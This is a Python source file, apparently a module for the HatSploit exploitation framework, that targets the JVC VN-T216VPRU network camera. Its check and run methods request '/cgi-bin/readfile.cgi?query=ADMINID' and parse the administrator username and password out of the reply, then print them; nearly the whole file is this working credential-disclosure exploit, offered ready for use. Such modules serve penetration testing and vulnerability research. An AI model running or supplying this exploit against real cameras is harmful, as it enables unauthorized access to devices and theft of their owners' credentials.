"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "JVC VN-T216VPRU Credentials Disclosure",
            'Module': "exploit/linux/jvc/t216vpru_credentials_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Yakir Wizman - vulnerability researcher"
            ],
            'Description': """
                JVC VN-T216VPRU camera has a vulnerability leading to complete
                credentials disclosure by an attacker.
            """,
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'References': [
                {'URL': 'https://www.exploit-db.com/exploits/40264'},
                {'URL': 'http://pro.jvc.com/'},
                {'URL': 'http://pro.jvc.com/prof/attributes/features.jsp?model_id=MDL102145'},
                {'EDB': 40264}
            ],
            'DisclosureDate': "2016-08-19",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

    def check(self):
        response = self.http_request(
            method="GET",
            path='/cgi-bin/readfile.cgi?query=ADMINID',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path='/cgi-bin/readfile.cgi?query=ADMINID',
        )

        try:
            username = (
                response.text.split(';')[0].replace('var Adm_ID="', '', 1)[0:-1].strip()
            )
            password = (
                response.text.split(';')[1]
                .replace('var Adm_Pass1="', '', 1)[0:-1]
                .strip()
            )

            self.print_table(
                "Credentials", ('Username', 'Password'), (username, password)
            )
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")
